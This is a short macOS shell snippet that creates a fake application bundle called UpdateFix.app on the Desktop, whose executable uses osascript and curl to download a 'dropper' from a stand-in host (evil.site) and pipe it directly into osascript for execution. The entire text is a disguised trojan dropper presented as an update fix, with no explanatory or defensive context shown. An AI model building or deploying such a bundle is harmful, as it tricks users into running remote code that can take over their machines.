mkdir -p ~/Desktop/UpdateFix.app/Contents/MacOS
echo -e '#!/bin/bash\nosascript -e "do shell script \"curl http://evil.site/dropper | osascript -\""' > ~/Desktop/UpdateFix.app/Contents/MacOS/UpdateFix
chmod +x ~/Desktop/UpdateFix.app/Contents/MacOS/UpdateFix
